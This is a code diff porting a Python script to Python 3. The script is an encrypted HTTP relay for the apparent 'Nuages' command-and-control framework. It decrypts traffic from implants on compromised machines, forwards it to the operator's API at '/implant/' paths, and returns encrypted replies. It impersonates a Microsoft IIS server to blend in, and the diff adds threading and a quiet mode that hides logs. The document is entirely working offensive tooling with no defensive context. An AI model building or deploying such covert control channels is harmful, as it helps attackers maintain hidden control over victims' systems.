@@ -1,6 +1,7 @@
 #!/usr/bin/env python
-from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
-from SimpleHTTPServer import SimpleHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from http.server import SimpleHTTPRequestHandler
+from socketserver import ThreadingMixIn
 import base64
 import hashlib
 import requests
@@ -9,9 +10,10 @@ from Crypto.Cipher import AES
 import cgi
 from sys import argv
 import binascii
-import StringIO
+import io
 import argparse
 import os
+import sys
 
 class HTTPerror(Exception):
     def __init__(self,HTTPCode,HTTPContent):
@@ -24,29 +26,25 @@ class PKCS7Encoder(object):
 
     ## @param text The padded text for which the padding is to be removed.
     # @exception ValueError Raised when the input padding is missing or corrupt.
-    def decode(self, text):
+    def decode(self, bytestring):
         '''
         Remove the PKCS#7 padding from a text string
         '''
-        nl = len(text)
-        val = int(binascii.hexlify(text[-1]), 16)
+        val = bytestring[-1]
         if val > self.k:
             raise ValueError('Input is not padded or padding is corrupt')
-
-        l = nl - val
-        return text[:l]
+        l = len(bytestring) - val
+        return bytestring[:l]
 
     ## @param text The text to encode.
-    def encode(self, text):
-        '''
-        Pad an input string according to PKCS#7
-        '''
-        l = len(text)
-        output = StringIO.StringIO()
+    def encode(self, bytestring):
+        """
+        Pad an input bytestring according to PKCS#7
+
+        """
+        l = len(bytestring)
         val = self.k - (l % self.k)
-        for _ in xrange(val):
-            output.write('%02x' % val)
-        return text + binascii.unhexlify(output.getvalue())
+        return bytestring + bytearray([val] * val)
 
 class AESCipher(object):
 
@@ -73,24 +71,14 @@ class AESCipher(object):
     def _unpad(self, s):
         return pkcs7.decode(s)
 
-        
+class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
+    pass
+
 class S(SimpleHTTPRequestHandler):
-    def send_response(self, code, message=None):
-        self.log_request(code)
-        if message is None:
-            if code in self.responses:
-                message = self.responses[code][0]
-            else:
-                message = ''
-        if self.request_version != 'HTTP/0.9':
-            self.wfile.write("%s %d %s\r\n" %
-                             (self.protocol_version, code, message))
-            # print (self.protocol_version, code, message)
+    def _set_headers(self, code):
+        self.send_response_only(code)
         self.send_header('Server', "Microsoft-IIS/8.0")
         self.send_header('Date', self.date_time_string())
-
-    def _set_headers(self, code):
-        self.send_response(code)
         self.send_header('Content-type', 'text/html')
         self.end_headers()
 
@@ -103,18 +91,24 @@ class S(SimpleHTTPRequestHandler):
             raise HTTPerror(response.status_code,response.content)
 
     def do_POST(self):
-        length = int(self.headers.getheader('content-length'))
-        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers.getheader('Authorization')))
-        print(url)
+        length = int(self.headers['content-length'])
+        url = "/implant/" + aes.decrypt(base64.b64decode(self.headers['Authorization']))
         try:
             response = (self.POST(url,aes.decrypt(self.rfile.read(length))))
             self._set_headers(200)
             self.wfile.write(aes.encrypt(response))
+            if(not(args.quiet)):
+                self.log_request(200)
+                print(url)
         except HTTPerror as e:
             self._set_headers(e.HTTPCode)
             self.wfile.write(aes.encrypt(e.HTTPContent))
+            if(not(args.quiet)):
+                self.log_request(e.HTTPCode)
+                print(url)
         except Exception as e:
-            print(e)
+            raise e
+
 
     def do_GET(self):
         if args.directory == None:
@@ -124,12 +118,27 @@ class S(SimpleHTTPRequestHandler):
             SimpleHTTPRequestHandler.send_error(self,404)
             return
         SimpleHTTPRequestHandler.do_GET(self)
-            
-def run(server_class=HTTPServer, handler_class=S, port=4040):
+    
+    def log_message(self, format, *args2):
+        if(args.quiet):
+            return       
+        sys.stderr.write("%s - - [%s] %s\n" %
+                         (self.address_string(),
+                          self.log_date_time_string(),
+                          format%args2))
+        
+def run(server_class=ThreadingSimpleServer, handler_class=S, port=4040):
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
-    print('Starting httpd...')
-    httpd.serve_forever()
+    print('Starting AES256 Handler on port: ' + str(port))
+    try:
+        while 1:
+            sys.stdout.flush()
+            httpd.handle_request()
+    except KeyboardInterrupt:
+        print('Finished.')
+        sys.exit()
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='Start an encrypted Nuages HTTP handler')
@@ -137,6 +146,7 @@ if __name__ == "__main__":
     parser.add_argument("-k", "--key", required=True, help="The seed for the encryption key")
     parser.add_argument("-u", "--uri", default="http://127.0.0.1:3030", help="The URI of the Nuages API")
     parser.add_argument("-d", "--directory", help="Directory to serve for GET requests")
+    parser.add_argument("-q", "--quiet", action='store_true', help="Hide logs")
     args = parser.parse_args() 
     # The encryption password
     aes = AESCipher(args.key)
@@ -146,6 +156,6 @@ if __name__ == "__main__":
     if args.directory != None:
         os.chdir(args.directory)
     if len(argv) > 1:
-        run(HTTPServer, S, int(args.port))
+        run(ThreadingSimpleServer, S, int(args.port))
     else:
         run()
